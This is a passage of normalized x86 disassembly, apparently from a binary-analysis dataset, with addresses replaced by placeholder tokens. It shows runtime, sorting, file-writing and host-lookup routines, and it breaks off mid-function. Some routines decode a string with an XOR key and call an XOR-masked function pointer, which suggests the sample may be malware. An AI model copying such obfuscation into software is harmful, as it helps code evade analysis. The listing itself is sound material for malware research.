mov eax [ eax ]
mov edx [ edi ]
mov eax ebx
lea esi [ eax + 0x2 ]
jmp r-xdata
mov eax [ ebp - 0x70 ]
add edi 0x4
cmp edi [ eax + 0x8 ]
jne r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov eax [ edi ]
add eax 0x20
cmp [ eax + 0x14 ] 0x8
jb r-xdata
sub eax esi
sar eax 0x1
push eax
push ebx
lea ecx [ edx + 0x4 ]
call sub_1005e3c0
mov eax [ edi ]
mov cx [ ebp + 0x10 ]
mov esi [ ebp - 0x78 ]
mov [ eax + 0x3c ] cx
xor ebx ebx
xor edx edx
mov eax esi
mov [ ebp - 0x3c ] 0x7
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x50 ] dx
lea ecx [ eax + 0x2 ]
lea ecx [ ecx ]
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x50 ]
call sub_1005e3c0
mov edx [ ebp - 0x7c ]
lea eax [ ebp - 0x50 ]
push eax
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] ebx
call sub_10045750
add esp 0x4
push eax
mov edx r--data
lea esi [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0x1
call sub_10045750
add esp 0x4
mov [ ebp - 0x4 ] 0x2
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax ebx
sar eax 0x1
push eax
push edx
lea ecx [ esi + 0x40 ]
call sub_1005e3c0
mov esi 0x8
cmp [ ebp - 0x58 ] esi
jb r-xdata
mov esi [ edi ]
mov eax edx
lea ebx [ eax + 0x2 ]
lea ebx [ ebx ]
xor edx edx
mov ebx 0x7
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] 0x0
mov [ ebp - 0x6c ] dx
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov ecx [ ebp - 0x6c ]
push ecx
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] cx
cmp [ ebp - 0x3c ] esi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ edi ]
mov dl [ ebp + 0x18 ]
xor eax eax
mov [ ecx + 0x3e ] dl
mov edx [ ebp - 0x74 ]
mov ecx [ ebp + 0x1c ]
mov [ ebp - 0x50 ] ax
mov eax [ edi ]
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x40 ] 0x0
mov [ eax + 0xcc ] ecx
test edx edx
je r-xdata
mov edx [ ebp - 0x50 ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x70 ]
mov eax [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx eax
sub edx ecx
push sub_10017220
sar edx 0x2
push edx
push eax
push ecx
call sub_10060520
add esp 0x10
xor eax eax
lea ecx [ ecx ]
mov eax edx
lea esi [ eax + 0x2 ]
lea esp [ esp ]
inc eax
cmp eax 0x11
jb r-xdata
mov eax 0x1
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ edi ]
sub eax esi
sar eax 0x1
push eax
push edx
add ecx 0x20
call sub_1005e3c0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x18
sub_1000bbf0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_1000e7a4
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_1001742d
pop ecx
push eax
call sub_1001b6f0
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_1001742d
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_1001742d
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push edi
push esi
call sub_1001742d
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_1001742d
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
pop edi
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_1000bd20
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fb20
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x2
mov esi ecx
xor ebx ebx
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_1005d090
mov [ ebp - 0x4 ] ebx
mov ecx [ esi ]
mov edx [ esi + 0x4 ]
mov eax 0xf
mov esi 0x10
mov [ ebp - 0x48 ] bl
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x38 ] 0x8
cmp eax esi
jae r-xdata
mov [ ecx + 0x8 ] bl
push 0xffffffff
push ebx
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10040f60
cmp [ ebp - 0x34 ] esi
jb r-xdata
lea ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jae r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10065045
add esp 0x4
push edi
push 0x1
push eax
call [ StrToIntExA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jb r-xdata
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov al 0x1
mov eax [ ebp - 0x2c ]
push eax
call sub_10065045
add esp 0x4
xor al al
jmp r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1000be20
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ rw-data ]
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov al 0x38
xor [ ebp + 0x8 ] al
xor [ ebp + 0x9 ] al
xor [ ebp + 0xa ] al
xor [ ebp + 0xb ] al
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] 0x5
call [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_1000be5f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp ecx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov eax [ eax ]
cmp eax [ ebp + 0xc ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x8
sub_1000be80
push ebp
mov ebp esp
sub esp 0x8
mov ecx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
mov eax ecx
sub eax ebx
sar eax 0x2
cdq
push esi
sub eax edx
sar eax 0x1
push edi
lea edi [ ebx + eax * 4 ]
mov eax [ ebp + 0x14 ]
push eax
add ecx 0xfffffffc
push ecx
mov esi ebx
call sub_100053e0
add esp 0x8
lea esi [ edi + 0x4 ]
mov [ ebp - 0x4 ] esi
cmp ebx edi
jae r-xdata
cmp esi [ ebp + 0x10 ]
jae r-xdata
lea ebx [ ebx ]
mov ebx edi
mov edi edi
mov edi edi
mov eax [ edi - 0x4 ]
mov ecx [ edi ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
cmp ebx [ ebp + 0xc ]
jbe r-xdata
mov eax [ esi ]
mov ecx [ edi ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] esi
mov ecx [ esi ]
mov edx [ edi ]
push ecx
push edx
call ebx
add esp 0x8
test eax eax
jne r-xdata
add edi 0xfffffffc
cmp ebx edi
jb r-xdata
jne r-xdata
mov eax [ edi ]
mov ecx [ ebx - 0x4 ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
add esi 0x4
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov edx [ edi ]
mov eax [ esi ]
push edx
push eax
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
add esi 0x4
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov ecx [ edi ]
mov edx [ edi - 0x4 ]
push ecx
push edx
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
sub ebx 0x4
cmp esi [ ebp + 0x10 ]
jne r-xdata
cmp esi [ ebp + 0x10 ]
je r-xdata
add ebx 0xfffffffc
cmp [ ebp + 0xc ] ebx
jb r-xdata
mov edx [ ebx - 0x4 ]
mov eax [ edi ]
push edx
push eax
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ esi ]
mov eax ecx
add ecx 0x4
mov [ ebp - 0x4 ] ecx
mov ecx [ eax ]
mov [ eax ] edx
mov [ esi ] ecx
mov edx [ edi ]
mov eax [ esi ]
mov ebx [ ebp + 0x14 ]
push edx
push eax
call ebx
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx [ ebx ]
mov [ esi ] ecx
mov [ ebx ] eax
add esi 0x4
jmp r-xdata
sub edi 0x4
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edi
pop edi
pop esi
mov [ eax + 0x4 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp eax esi
je r-xdata
cmp ebx [ ebp + 0xc ]
mov ecx [ ebx - 0x4 ]
mov eax [ edi - 0x4 ]
sub edi 0x4
mov [ edi ] ecx
mov [ ebx - 0x4 ] eax
cmp esi [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax - 0x4 ]
mov ecx [ edi ]
sub eax 0x4
mov [ edi ] edx
mov [ ebp - 0x4 ] eax
mov [ eax ] ecx
jmp r-xdata
mov edx [ edi ]
mov eax [ ebx ]
mov [ ebx ] edx
mov [ edi ] eax
mov ecx edi
mov edx [ ecx ]
add eax 0x4
mov [ ebp - 0x4 ] eax
mov eax esi
mov [ ebp - 0x8 ] edx
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ ebp - 0x8 ]
add edi 0x4
add esi 0x4
mov [ eax ] ecx
jmp r-xdata
mov edx [ eax ]
mov ecx [ edi ]
mov [ edi ] edx
mov [ eax ] ecx
sub_1000c030
push ebp
mov ebp esp
push 0xffffffff
push sub_10081300
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x71c71c7
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
jae r-xdata
push r--data
call sub_100616c6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
call sub_100689c0
mov [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edi
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_1004c0d0
mov edi [ esi + 0x4 ]
mov ecx [ esi ]
mov edx edi
sub edx ecx
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov ebx edx
shr ebx 0x1f
add esp 0xc
add ebx edx
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax + eax * 8 ]
mov eax [ ebp - 0x14 ]
lea ecx [ eax + edx * 4 ]
lea edx [ ebx + ebx * 8 ]
mov [ esi + 0x8 ] ecx
lea ecx [ eax + edx * 4 ]
mov [ esi + 0x4 ] ecx
mov [ esi ] eax
mov eax ecx
call sub_1001b300
mov ecx [ esi ]
push ecx
call sub_10065045
add esp 0x4
sub_1000c130
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
retn
nop
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
sub_1000c170
push ebp
mov ebp esp
push ecx
push esi
push edi
xor edi edi
push edi
push 0x80
push 0x2
push edi
push edi
push 0xc0000000
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push edi
lea ecx [ ebp - 0x4 ]
push ecx
push edx
push eax
push esi
mov [ ebp - 0x4 ] edi
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
lea eax [ edi + 0x1 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
push esi
call [ CloseHandle@IAT ]
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
mov edi 0x2
sub_1000c1e0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
cmp eax ecx
jae r-xdata
mov ebx [ ebp + 0x10 ]
sub eax ecx
cmp eax ebx
jae r-xdata
push r--data
call sub_1003b4a6
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_100616c6
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
lea edi [ eax + ebx ]
cmp edi 0x7ffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_100616c6
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1000fb70
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x8
cmp [ edx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
pop edi
mov ecx edx
mov ecx [ edx ]
jmp r-xdata
pop edi
mov eax esi
xor edx edx
pop esi
mov [ eax ] dx
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax ] dx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
lea edx [ ebx + ebx ]
push edx
mov edx [ ebp + 0xc ]
lea ecx [ ecx + edx * 2 ]
mov edx [ esi + 0x10 ]
push ecx
lea eax [ eax + edx * 2 ]
push eax
call sub_10078600
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
sub_1000c2f0
push ebp
mov ebp esp
sub esp 0x230
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
lea eax [ ebp - 0x230 ]
push eax
push 0x2
mov ebx ecx
call [ WSAStartup@IAT ]
test eax eax
je r-xdata
push 0x80
lea ecx [ ebp - 0xa0 ]
push ecx
call [ gethostname@IAT ]
test eax eax
je r-xdata
mov eax 0x1
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xa0 ]
push edx
call [ gethostbyname@IAT ]
mov esi eax
test esi esi
jne r-xdata
call [ WSACleanup@IAT ]
mov eax 0x2
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x1c ]
mov eax 0x13
call sub_10036cd0
mov eax [ esi + 0xc ]
mov eax [ eax ]
movzx ecx [ eax + 0x3 ]
movzx edx [ eax + 0x2 ]
push ecx
movzx ecx [ eax + 0x1 ]
push edx
movzx edx [ eax ]
push ecx
push edx
lea eax [ ebp - 0x1c ]
push eax
mov ecx 0x10
call sub_100254a0
add esp 0x14
call [ WSACleanup@IAT ]
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
call [ WSACleanup@IAT ]
lea eax [ esi + 0x3 ]
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1000c3da
push 0x30
mov eax sub_1007f21c
call sub_10007703
mov eax [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0x20 ]
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x34 ] ecx
jb r-xdata
xor ebx ebx
cmp [ eax ] 0x2d
mov [ ebp - 0x30 ] bl
jne r-xdata
mov eax [ eax ]
mov cl [ eax ]
xor esi esi
jmp r-xdata
mov [ ebp - 0x30 ] 0x1
inc eax
cmp cl 0x30
jge r-xdata
cmp cl 0x39
jg r-xdata
push esi
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_1005d090
mov [ ebp - 0x4 ] ebx
cmp esi ebx
jne r-xdata
inc esi
mov cl [ esi + eax ]
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x3c ] esp
push eax
call sub_100408f0
push [ ebp - 0x30 ]
mov ecx [ ebp - 0x34 ]
push [ ebp + 0x1c ]
push [ ebp - 0x38 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_1006597a
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1001c5c0
mov eax edi
call sub_10019c00
retn 0x1c
push 0x30
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10050f80
sub_1000c490
push ebp
mov ebp esp
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ eax ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov ebx [ lstrcmpW@IAT ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x55
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xb
jb r-xdata
xor eax eax
mov [ ebp - 0xa ] ax
mov ecx [ esi ]
mov eax [ ecx + 0xc ]
lea edx [ ebp - 0x20 ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
mov ecx [ esi ]
push edi
call sub_10069130
test eax eax
jne r-xdata
mov ecx [ r--data ]
xor eax eax
lea esp [ esp ]
lea edx [ ebp - 0x6c ]
mov eax 0x15
call sub_1001bb80
mov ecx [ ebp - 0x8 ]
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
sub_1000c53b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_10044fed
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_1007ad63
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_10012d8f
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000c630
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f6bf
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x1c ]
xor edi edi
push 0x4
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x14 ] eax
push edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
call [ GetProcessHeap@IAT ]
mov ebx [ HeapAlloc@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x1c ] eax
inc [ eax ]
push 0x4
mov [ ebp - 0x4 ] edi
push edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x24 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x2c ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x34 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0x4
dec [ ebx ]
jne r-xdata
mov edx [ ecx + 0x4 ]
dec [ edx ]
cmp [ edx ] edi
jne r-xdata
mov [ esi + 0x3c ] eax
inc [ eax ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edi
push ecx
mov ecx [ ebp + 0x10 ]
push edx
call sub_10008200
mov ecx [ ebp + 0x20 ]
mov eax [ ecx ]
mov ebx [ ecx + 0x4 ]
inc [ ebx ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ebx
lea edx [ ebp - 0x18 ]
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x4 ] 0x5
cmp ecx edx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
cmp eax edi
je r-xdata
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] ebx
inc [ ebx ]
mov ecx [ ecx ]
mov [ ebp + 0x1c ] ecx
cmp ecx edi
je r-xdata
push ebx
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
call sub_10054700
mov ecx [ ebp - 0x18 ]
push ecx
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ esi + 0x1c ]
cmp ecx edi
je r-xdata
mov eax ecx
call sub_10054700
mov eax [ ebp + 0x1c ]
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x18 ]
push ecx
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x18 ]
sub_1000c810
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_1000c832
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1000363b
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1002868d
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10037533
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x1c
sub_1000c8b0
push ebp
mov ebp esp
push ecx
mov edx [ eax + 0x10 ]
push ebx
mov ebx [ eax + 0x14 ]
push edi
mov edi [ ecx + 0x10 ]
sub ebx edx
mov [ ebp - 0x4 ] 0x0
cmp edi ebx
jbe r-xdata
push 0xffffffff
push 0x0
push ecx
mov ecx eax
call sub_10040f60
mov ebx [ ecx + 0x14 ]
sub ebx edi
cmp ebx edx
jb r-xdata
push 0xffffffff
push 0x0
push eax
push 0x0
call sub_100196f0
jmp r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_100172f0
pop edi
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000c980
push ebp
mov ebp esp
push 0xffffffff
push sub_10081566
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x1c ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
mov ebx ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0xd8 ] eax
xor eax eax
mov [ ecx ] eax
mov [ ebp - 0xc0 ] ecx
push 0xffffffff
xor ecx ecx
mov [ ebp - 0xd0 ] edx
mov [ edx ] eax
push eax
lea edx [ ebx + 0x24 ]
mov [ ebp - 0x98 ] cx
push edx
lea ecx [ ebp - 0x98 ]
mov [ ebp - 0xb8 ] eax
